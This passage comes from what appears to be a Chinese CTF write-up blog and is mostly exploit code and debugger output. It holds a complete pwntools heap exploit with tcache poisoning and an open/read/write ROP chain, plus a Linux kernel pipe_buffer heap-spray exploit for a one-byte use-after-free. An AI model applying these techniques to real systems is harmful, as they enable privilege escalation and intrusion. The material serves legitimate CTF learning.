class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1824)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(op) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;&gt;&gt;&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;Note: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))*<span class="number">0x1000</span></span><br><span class="line">heap_base = leak_addr</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i+<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a0f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">fake_heap_addr = heap_base + <span class="number">0x910</span></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(fake_heap_addr+<span class="number">0x18</span>)+p64(fake_heap_addr+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_heap_addr)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">13</span>,payload.ljust(<span class="number">0x70</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(<span class="number">0x80</span>))</span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">fake_heap_addr = heap_base + <span class="number">0x790</span></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(fake_heap_addr+<span class="number">0x18</span>)+p64(fake_heap_addr+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_heap_addr)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">10</span>,payload.ljust(<span class="number">0x70</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(<span class="number">0x80</span>))</span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">key = (heap_base + <span class="number">0x7a0</span>) &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(environ ^ key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">stack_addr = leak_addr - <span class="number">0x140</span> - <span class="number">0x8</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x00000000000796a2</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">open_libc = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x400</span>)</span><br><span class="line">payload += p64(read_libc) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(stack_addr ^ key))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">0x30</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base+<span class="number">0x3a0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_libc) </span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heap_base+<span class="number">0x3a0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(read_libc) </span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(write_libc) </span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version <span class="number">6.4</span><span class="number">.0</span> (root@ubuntu-<span class="keyword">virtual</span>-machine) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">23</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append &quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot; \</span><br><span class="line">    -cpu kvm64,+smep,+smap\</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot </span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">insmod /test.ko</span><br><span class="line">chmod 666 /dev/water</span><br><span class="line">chmod 740 /flag</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">chmod 400 /proc/kallsyms</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /tmp</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>首先下载并编译对应版本的内核</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-image-6.2.0-36-generic-dbgsym</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>一次 UAF 并且只能控制第1字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(&amp;pointer, arg, <span class="number">8LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(chunk);</span><br><span class="line">      ++delete_idx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(&amp;pointer, arg, <span class="number">8LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !copy_from_user(chunk, pointer.buf, <span class="number">1LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++edit_idx;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>具体的思路就是：</p>
<ul>
<li>申请堆 -&gt; 释放 -&gt; 堆喷内核结构体 -&gt; 修改第1字节</li>
</ul>
<p>需要利用的内核结构体就是 <code>pipe_buffer</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size:0x28*0x10(kmalloc-0x400) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们创建一个管道时，在内核中会生成16个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
<li>pipe 系统调用提供了 <code>fcntl(F_SETPIPE_SZ)</code> 让我们可以重新分配 <code>pipe_buffer</code> 并指定其数量</li>
</ul>
<p>内核结构体 <code>pipe_buffer</code> 的第一个条目为 <code>page</code>，覆盖末尾字节就可能导致 <code>page</code> 重叠：</p>
<img src="/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/1700041832088.png" class width="1700041832088"> 
<p>下面是堆喷 <code>pipe_buffer</code> 的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0x31</span>,<span class="number">0x200</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x20</span>,&amp;buf);</span><br><span class="line">ioctl(fd,<span class="number">0x30</span>,&amp;buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe_list[i]) == <span class="number">-1</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">        <span class="comment">/* 8 * pipe_buffer = 0x180 kmalloc-512 */</span> </span><br><span class="line">        errPrint(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x50</span>,&amp;buf); <span class="comment">/* 覆盖pipe_buffer-&gt;page末尾字节 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> victim_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> orig_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tag, <span class="number">0</span>, <span class="keyword">sizeof</span>(tag));</span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], tag, <span class="number">8</span>);</span><br><span class="line">    read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tag, <span class="string">&quot;AAAAAAAA&quot;</span>) &amp;&amp; nr != i)&#123;</span><br><span class="line">        orig_idx = nr;</span><br><span class="line">        victim_idx = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,victim_idx, orig_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (orig_idx == <span class="number">-1</span> || victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">    errPrint(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888006e46600</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0xffff888006e46600</span> —▸ <span class="number">0xffffea00001bef80</span> ◂— <span class="number">0xfffffc0000000</span> <span class="comment">/* page */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff888006e46608</span> ◂— <span class="number">0xc00000000</span> <span class="comment">/* offset, len */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff888006e46610</span> —▸ <span class="number">0xffffffff82246ec0</span> ◂— <span class="number">0x0</span> <span class="comment">/* ops */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff888006e46618</span> ◂— <span class="number">0x10</span> </span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff888006e46620</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888006e46600</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r10 rdi<span class="number">-1</span> <span class="number">0xffff888006e46600</span> —▸ <span class="number">0xffffea00001bef00</span> ◂— <span class="number">0xfffffc0000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│           <span class="number">0xffff888006e46608</span> ◂— <span class="number">0xc00000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│           <span class="number">0xffff888006e46610</span> —▸ <span class="number">0xffffffff82246ec0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│           <span class="number">0xffff888006e46618</span> ◂— <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│           <span class="number">0xffff888006e46620</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现 <code>page</code> 末尾被覆盖</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0xffffea00001bef00</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x00\xef\x1b\x00\x00\xea\xff\xff<span class="number">&#x27;</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888006e46600</span> <span class="number">0xffffea00001bef00</span></span><br><span class="line">&lt;pt&gt;            <span class="number">0xffff888006e46a00</span> <span class="number">0xffffea00001bef00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>导致有两个 <code>pipe_buffer</code> 指向同一个 <code>page</code></li>
</ul>
<p>接下来就可以利用 UAF <code>pipe_buffer</code> 来泄露数据：</p>
<ul>
<li>释放 UAF <code>pipe_buffer</code>（4k的缓冲页也会被释放，释放之后数据不会清除仍然可读写）</li>
<li>使用 <code>fcntl(F_SETPIPE_SZ)</code> 重新分配 <code>pipe_buffer</code>，部分的 <code>pipe_buffer</code> 就会被申请到之前我们释放的4k缓冲页上</li>
<li>利用 UAF 对4k缓冲页进行读取就可以泄露地址</li>
</ul>
<img src="/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/1700043734977.png" class width="1700043734977"> 
<p>下面是测试样例：</p>
